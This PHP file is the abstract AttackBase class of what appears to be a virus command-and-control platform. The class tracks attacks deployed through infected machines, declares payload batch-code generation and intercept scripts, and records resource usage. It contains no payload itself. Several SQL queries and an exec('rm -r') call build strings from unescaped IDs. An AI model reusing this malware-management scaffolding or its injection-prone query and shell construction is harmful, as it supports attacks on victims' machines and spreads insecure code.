<?php /** @noinspection PhpIncludeInspection */

namespace Kelvinho\Virus\Attack;

use Kelvinho\Virus\Network\RequestData;
use Kelvinho\Virus\Network\Session;
use Kelvinho\Virus\Singleton\Header;
use Kelvinho\Virus\Singleton\Logs;
use Kelvinho\Virus\Usage\Usage;
use Kelvinho\Virus\Usage\UsageFactory;
use Kelvinho\Virus\User\UserFactory;
use Kelvinho\Virus\Virus\VirusFactory;
use mysqli;

/**
 * Abstract class AttackBase. All attacks should subclass this.
 *
 * Represents an attack. The representation of this will be stored in table attacks, and the data stored on disk is at:
 * DATA_FILE/attacks/{attack_id}/
 *
 * Currently, these are stored on disk:
 * - Profile text, at /profile.txt
 * - Additional info, at /state.json, utilized by subclasses
 *
 * @package Kelvinho\Virus\Attack
 * @author Quang Ho <157239q@gmail.com>
 * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
 * @license http://www.opensource.org/licenses/mit-license.html  MIT License
 */
abstract class AttackBase {
    public const STATUS_DORMANT = "Dormant";
    public const STATUS_EXECUTED = "Executed";
    public const STATUS_DEPLOYED = "Deployed";
    public const TYPE_ONE_TIME = 1;
    public const TYPE_SESSION = 2;
    public const TYPE_BACKGROUND = 3;
    public const STATUSES = [self::STATUS_DORMANT, self::STATUS_DEPLOYED, self::STATUS_EXECUTED];
    protected string $attack_id;
    protected string $packageDbName; // this is read-only. After an attack is initialized, you can't change its package.
    protected string $status = self::STATUS_DORMANT;
    protected string $virus_id;
    protected string $name = "";
    protected string $profile = "";
    protected int $executed_time = 0;
    protected RequestData $requestData;
    protected Session $session;
    protected VirusFactory $virusFactory;
    protected AttackFactory $attackFactory;
    protected UserFactory $userFactory;
    private mysqli $mysqli;
    protected PackageRegistrar $packageRegistrar;
    protected Usage $usage;
    private UsageFactory $usageFactory;

    public function __construct() {
    }

    function setContext(RequestData $requestData, Session $session, UserFactory $userFactory, VirusFactory $virusFactory, AttackFactory $attackFactory, mysqli $mysqli, PackageRegistrar $packageRegistrar, UsageFactory $usageFactory) {
        $this->requestData = $requestData;
        $this->session = $session;
        $this->userFactory = $userFactory;
        $this->virusFactory = $virusFactory;
        $this->attackFactory = $attackFactory;
        $this->mysqli = $mysqli;
        $this->packageRegistrar = $packageRegistrar;
        $this->usageFactory = $usageFactory;
    }

    public function getAttackId(): string {
        return $this->attack_id;
    }

    function setAttackId(string $attack_id): void {
        $this->attack_id = $attack_id;
    }

    public function getStatus(): string {
        return $this->status;
    }

    public function isStatus(string $status): bool {
        return $status == $this->status;
    }

    public function getType(): int {
        if (strpos($this->packageDbName, "oneTime") !== false) return self::TYPE_ONE_TIME;
        if (strpos($this->packageDbName, "session") !== false) return self::TYPE_SESSION;
        if (strpos($this->packageDbName, "background") !== false) return self::TYPE_BACKGROUND;
        Logs::unreachableState("\\Kelvinho\\Virus\\Attack\\AttackBase");
        return -1;
    }

    public function getName(): string {
        return $this->name;
    }

    public function setName(string $name): void {
        $this->name = $name;
    }

    public function getPackageDbName(): string {
        return $this->packageDbName;
    }

    public function setPackageDbName(string $packageDbName): void {
        $this->packageDbName = $packageDbName;
    }

    public function getVirusId(): string {
        return $this->virus_id;
    }

    public function setVirusId(string $virus_id): void {
        $this->virus_id = $virus_id;
    }

    public function getStatePath(): string {
        return DATA_FILE . "/attacks/$this->attack_id/state.json";
    }

    public function loadState(): void {
        if (!$answer = $this->mysqli->query("select name, virus_id, attack_package, status, executed_time, resource_usage_id from attacks where attack_id = \"$this->attack_id\"")) throw new AttackNotFound();
        if (!$row = $answer->fetch_assoc()) throw new AttackNotFound();

        $this->virus_id = $row["virus_id"];
        $this->packageDbName = $row["attack_package"];
        $this->name = $row["name"];
        $this->status = $row["status"];
        $this->executed_time = $row["executed_time"];
        $this->usage = $this->usageFactory->get($row["resource_usage_id"]);
        $this->setState(file_get_contents($this->getStatePath()));
        $this->setProfile(file_get_contents(DATA_FILE . "/attacks/$this->attack_id/profile.txt"));
    }

    /**
     * This will restore the state of an attack with all of its configuration using a json string.
     *
     * @param string $json The JSON string
     */
    abstract protected function setState(string $json): void;

    /**
     * This will save the state of everything about this attack.
     */
    public function saveState(): void {
        file_put_contents(DATA_FILE . "/attacks/$this->attack_id/state.json", $this->getState());
        file_put_contents(DATA_FILE . "/attacks/$this->attack_id/profile.txt", $this->getProfile());
        if (!$this->mysqli->query("update attacks set status = \"$this->status\", name = \"" . $this->mysqli->escape_string($this->name) . "\", executed_time = $this->executed_time where attack_id = \"$this->attack_id\"")) Logs::mysql($this->mysqli);
    }

    /**
     * This will get the state of an attack as a json string.
     *
     * @return string The JSON string
     */
    abstract protected function getState(): string;

    public function getProfile(): string {
        return $this->profile;
    }

    public function setProfile(string $profile): void {
        $this->profile = $profile;
    }

    /**
     * This should generate the actual batch code to be run as payload.
     * Expected (but not required) to call BaseScript::payloadConfirmationLoop() to generate the appropriate payload confirmation loop.
     */
    abstract public function generateBatchCode(): void;

    /**
     * This will include some extra resources that the attack might need. Things like other scripts and configs.
     *
     * @param string $resourceIdentifier The resource name
     */
    abstract public function processExtras(string $resourceIdentifier): void;

    /**
     * This will include the correct controller for this particular attack type and then include the "base" controller
     * with the same name. It is intended to be used this way, because then the specific packages can even decide if
     * they want to not include the base controller (by ending the connection right away).
     *
     * @param string $controllerIdentifier
     */
    public function includeController(string $controllerIdentifier): void {
        @include($this->packageRegistrar->getLocation($this->packageDbName) . "/controller/$controllerIdentifier.php");
        @include(__DIR__ . "/common/controller/$controllerIdentifier.php");
    }

    /**
     * This will include the correct intercept script
     */
    public function includeIntercept(): void {
        include($this->packageRegistrar->getLocation($this->packageDbName) . "/intercept.php");
    }

    /**
     * Deploys the attack.
     */
    public function deploy(): void {
        $this->status = self::STATUS_DEPLOYED;
    }

    /**
     * Cancels the attack.
     */
    public function cancel(): void {
        $this->status = self::STATUS_DORMANT;
    }

    /**
     * Sets this attack to be executed.
     */
    public function setExecuted(): void {
        $this->status = self::STATUS_EXECUTED;
        $this->executed_time = time();
        $this->reportStaticUsage();
    }

    /**
     * Return the executed time. Is 0 if this attack has not been executed.
     *
     * @return int The unix timestamp
     */
    public function getExecutedTime(): int {
        return $this->executed_time;
    }

    /**
     * Deletes the attack permanently.
     */
    public function delete(): void {
        if (!$this->mysqli->query("delete from attacks where attack_id = \"$this->attack_id\"")) Logs::mysql($this->mysqli);
        if (!$this->mysqli->query("delete from resource_usage where id = " . $this->usage->getId())) Logs::mysql($this->mysqli);
        $virus = $this->virusFactory->get($this->virus_id);
        $virus->usage()->minusStatic($this->usage)->saveState();
        $this->userFactory->get($virus->getUserHandle())->usage()->minusStatic($this->usage)->saveState();
        exec("rm -r " . DATA_FILE . "/attacks/$this->attack_id");
    }

    public function usage(): Usage {
        return $this->usage;
    }

    /**
     * Assumes the attack has the correct usages so far, and this should trickle the change upwards to viruses and users.
     * Supposed to be called only once by the attack packages when they are finished.
     */
    public function reportStaticUsage(): void {
        $virus = $this->virusFactory->get($this->virus_id);
        $virus->usage()->addStatic($this->usage)->saveState();
        $this->userFactory->get($virus->getUserHandle())->usage()->addStatic($this->usage)->saveState();
    }

    /**
     * Assumes the attack has the correct usages so far, and this should trickle the change upwards to viruses and users.
     * Supposed to be called multiple times during an intercept of a background attack.
     */
    public function reportDynamicUsage(): void {
        $virus = $this->virusFactory->get($this->virus_id);
        $virus->usage()->addDynamic($this->usage)->saveState();
        $this->userFactory->get($virus->getUserHandle())->usage()->addDynamic($this->usage)->saveState();
        $this->usage->resetDynamic()->saveState();
    }

    /**
     * Returns an array of 2 attack ids representing the previous and next attack. Can be null.
     *
     * @return array
     */
    public function getAround(): array {
        $around = [null, null];
        if (!$answer = $this->mysqli->query("select attack_id from attacks where virus_id=\"$this->virus_id\" and executed_time > " . $this->executed_time . " order by executed_time limit 1")) Logs::mysql($this->mysqli);
        if ($row = $answer->fetch_assoc()) $around[1] = $row["attack_id"];
        if (!$answer = $this->mysqli->query("select attack_id from attacks where virus_id=\"$this->virus_id\" and executed_time < " . $this->executed_time . " order by executed_time desc limit 1")) Logs::mysql($this->mysqli);
        if ($row = $answer->fetch_assoc()) $around[0] = $row["attack_id"];
        return $around;
    }
}
